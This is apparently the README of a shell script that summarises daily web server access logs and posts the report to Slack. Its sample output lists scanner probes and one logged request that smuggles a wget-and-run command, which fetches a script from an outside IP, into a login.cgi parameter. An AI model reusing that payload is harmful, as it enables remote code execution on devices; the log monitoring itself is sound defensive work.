# dailyHttpdLogcheck
Simple httpd log daily checker

Summary log file.

- Source IP/ASN
- User agent
- Request

# Usage

NOTE: Only Ubuntu has confirmed the operation.

NOTE: Will be clone to /opt/dailyLogCheck/ .

1. clone hogehogehugahuga/dailyHttpdLogcheck

```
$ sudo -s
# cd /opt
# git clone https://github.com/hogehuga/dailyLogCheck.git
```

2. Change the setting according to your own environment.

- On dailyLogCheck.sh
  - ACCSESSLOG (eg. /var/log/httpd/access_log)
  - DISPLINE (eg. Enter 30 to display 30 lines.)
  - IGNORE (eg. if not clone to /opt/dailyLogcheck, change directory)
- On DailyLogCheck-cron.sh
  - GITDIR (eg. if not clone to /opt/dailyLogcheck, change directory)
- pushSlack.sh
  - WEBHOOKURL (see slack's Incoming Webhook manual.)
  - CHANNEL (Webhook post channel)
  - BOTNAME (Name for post user)

3. TEST; dailyLogCheck.sh

- kick ./dailyLogCheck.sh
  - If the settings are correct, the report will be printed to standard output.

```
root@wwwhost:/opt/dailyLogCheck# ./dailyLogCheck.sh 
---Apply exclusion settings(ignore.list)--
HTTPD log watcher (5/May/2020)
---Source IP/ASN counts---
COUNT\tIP\tASN
 12     xxx.xxx.xxx   ASNNNNN xxxxx.LTD
 9      xxx.xxx.xxx   ASNNNNN xxxxx.LTD
 8      xxx.xxx.xxx   ASNNNNN xxxxx.LTD
 6      xxx.xxx.xxx   ASNNNNN xxxxx.LTD
...
```

If you get an error, check the following:

- Make sure the path is correct.
  - ACCESSLOG
- Make sure the format is correct.
  - IGNORE
    - This is "grep based RegExp."

4. TEST; pushSlack.sh

- kick ./pushSlack.sh as `echo "test" | ./pushSlack.sh` .
  - If successful, the post will be posted to Slack.

If you get an error, check the following:

- Make sure the value is correct.
  - WEBHOOK
  - CHANNEL

5. TEST; final, dailyLogCheck-cron.sh

- kick `# ./dailyLogCheck-cron.sh`
  - IF successful, repot will posted to slack.
  
If you get an error, check the following:

- Make sure the value is correct.
  - GITDIR
    - This script is kick "dailyLogCheck.sh" and "pushSlack.sh" only.

6. set the cron.

- setting to cron

```
# crontab -e
58 23 * * * /opt/dailyLogCheck/dailyLogCheck-cron.sh > /dev/null 2>&1
```

# contact

twitter; @hogehuga

# exsample

```
# ./daiyHttpdLogcheck.sh
HTTPD log watcher (24/Jun/2018)
---Source IP/ASN counts---
COUNT   IP      ASN
 12     xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 9      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 8      xxx.xxx.xxx.xxx  IP Address not found
 6      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 6      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 4      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 4      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 3      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 2      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 2      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
 2      xxx.xxx.xxx.xxx  AS15169 Google LLC
 2      xxx.xxx.xxx.xxx  AS15169 Google LLC
 2      xxx.xxx.xxx.xxx  AS15169 Google LLC
 2      xxx.xxx.xxx.xxx  AS15169 Google LLC
 2      xxx.xxx.xxx.xxx  ASnnn  xxxx inc.
---UserAgent counts---
==TOP5==
     49 -
     21 ZmEu
     12 Mozilla/5.0 (compatible; inoreader.com; 5 subscribers)
     12 Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
      8 WordPress/4.9.6; http://www.security-feed.club/wordpress
      4 Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
      3 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
      3 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
      3 Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
      2 Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
      2 Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
      2 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
      2 Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
      2 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
      1 Telesphoreo
==TAIL5==
      3 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
      3 Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
      3 Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36
      2 Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
      2 Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
      2 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
      2 Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
      2 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7
      1 Telesphoreo
      1 Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0 (FlipboardProxy/1.2; +http://flipboard.com/browserproxy)
      1 Mozilla/3.0 (compatible; Indy Library)
      1 Hello, World
      1 Headline-Reader [t] (http://www.infomaker.jp/)
      1 Hatena-Favicon2 (http://www.hatena.ne.jp/faq/)
---Request---
     43 HEAD / HTTP/1.0
     24 GET / HTTP/1.1
     16 GET /wordpress/?feed=rss2 HTTP/1.1
      7 GET /wordpress/?p=131 HTTP/1.1
      5 GET / HTTP/1.0
      3 GET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1
      3 GET /pma/scripts/setup.php HTTP/1.1
      3 GET /phpmyadmin/scripts/setup.php HTTP/1.1
      3 GET /phpMyAdmin/scripts/setup.php HTTP/1.1
      3 GET /myadmin/scripts/setup.php HTTP/1.1
      2 GET /robots.txt HTTP/1.1
      2 GET /MyAdmin/scripts/setup.php HTTP/1.1
      1 HEAD / HTTP/1.1
      1 GET /x HTTP/1.1
      1 GET /wordpress/?p=41 HTTP/1.1
      1 GET /setup.php HTTP/1.1
      1 GET /scripts/setup.php HTTP/1.1
      1 GET /other/iotsecjp3/ HTTP/1.1
      1 GET /mysqladmin/scripts/setup.php HTTP/1.1
      1 GET /myAdmin/scripts/setup.php HTTP/1.1
      1 GET /manager/html HTTP/1.1
      1 GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1
#
```
